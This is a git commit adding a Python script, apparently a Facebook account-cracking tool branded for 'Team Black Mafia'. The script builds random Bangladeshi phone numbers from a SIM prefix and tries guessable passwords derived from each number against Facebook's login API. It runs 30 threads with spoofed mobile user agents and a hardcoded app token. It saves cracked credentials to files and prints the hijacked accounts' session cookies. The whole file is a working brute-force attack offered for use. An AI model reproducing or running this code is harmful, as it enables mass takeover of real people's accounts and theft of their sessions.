3b308de06320dc0c25a1c8f501db6b10b83fa830
Petni-Lover-SKS <145772403+Petni-Lover-SKS@users.noreply.github.com>
2023-09-23 18:28:25 +0600

    Add files via upload

---
+++ PETNI LOVER.py
@@ -0,0 +1,164 @@
+#WRITTEN BY S.K Shallock
+#FOLLOW : https://github.com/Petni-Lover-SKS
+#------------- import -------------#
+import os
+from os import system as clr
+import random
+import string 
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+import re
+import sys
+import uuid
+import json
+#-------------color----------------#
+bblack="\033[1;30m"         # Black
+M="\033[1;31m"            # Red
+H="\033[1;32m"         # Green
+S="\033[1;33m"        # Yellow
+K="\033[1;34m"          # Blue
+P="\033[1;35m"        # Purple
+C="\033[1;36m"          # Cyan
+B="\033[1;37m"         # White
+my_color = [
+ B,C,P,H]
+warna = random.choice(my_color)
+oks=[]
+cps=[]
+loop=0
+#-------------logo-----------------#
+logo=(f'''{M}                         TEAM ⚔️ BLACK MAFIA ⚔️
+{H}▒▄█▀▀█▒▐█▒▐▀ ▒▄█▀▀█SHALLOCK
+{S}▒▀▀█▄▄▒▐██▌░ ▒▀▀█▄▄ PETNI LOVER 
+{H}▒█▄▄█▀▒▐█▒▐▄ ▒█▄▄█▀👻👻👻👻👻👻 
+{K}                            SKS
+{C} [this tool free for ⚔️ black Mafia ⚔️ ]
+{warna}--------------------------------------------{B}
+ Owner    : {C}Shallock{B}
+ Guthub   : {H}Petni-Lover-SKS{H}
+ Facebook : {M}Syber king Shallock{M}
+ Tools    : f{C}r{B}e{C}e{B}👻{M} •{warna}[{H} SHALLOCK {warna}]{warna}
+--------------------------------------------{B}''')
+#-------------linex def -------------#
+def linex():
+    print(f'{warna}--------------------------------------------{B}')
+#-------------clear def -------------#
+def clear():
+    clr('clear')
+    print(logo)
+#-------------main def------------#
+def MR_DIPTO():
+    clear()
+    os.system('xdg-open https://facebook.com/groups/1518980045572630/')
+    print(f'{B} [{warna}01{C}] RANDOM CLONING ')
+    os. system ('xdg-open https://facebook.com/groups/1518980045572630/')
+    print(f'{B} [{warna}00{C}] EXIT TERMINAL ')
+    linex()
+    option=input(f' {B}[{warna}??{M}] CHOICE MENU >> ')
+    if option in ['01','1']:
+        BD_CLONING()
+    else:
+        exit(' Thanks for using dear :)')
+#------------- bd clone def ----------#
+def BD_CLONING():
+    user=[]
+    clear()
+    os. system('xdg-open https://facebook.com/groups/1518980045572630/')
+    print('  SIM CODE : [016] [017] [018] [019]')
+    code=input(' ENTER SIM CODE >> ')
+    linex()
+    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
+    try:
+        limit=int(input(' ENTER LIMIT >> '))
+    except ValueError:
+        limit=50000
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with tred(max_workers=30) as Dipto:
+        tl=str(len(user))
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' YOUR SIM CODE : '+code)
+        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
+        linex()
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
+            Dipto.submit(method_crack,ids,passlist)
+    linex()
+    print(' THE PROGRESS HAS BEEN COMPLETE ')
+    print(' TOTAL OK ID '+str(len(oks)))
+    print(' TOTAL CP ID '+str(len(cps)))
+    input(' PRESS ENTER TO BACK  : ')
+    MR_DIPTO()
+    #User agents
+ugen2=['Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF']
+ugen=[
+    'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3',
+'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0',
+'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36',
+'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
+'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',]
+
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+#------------ method crack def ---------#
+def method_crack(ids,passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            url='https://api.facebook.com/method/auth.login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m[PING-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;32m [COOKIES] '+coki)
+                    open('/sdcard/SHALLOCK-OK.txt','a').write(str(uid)+' | '+pas+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;30m[SHALLOCK-CP] '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/PING-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#-------------end----------------#
+MR_DIPTO()
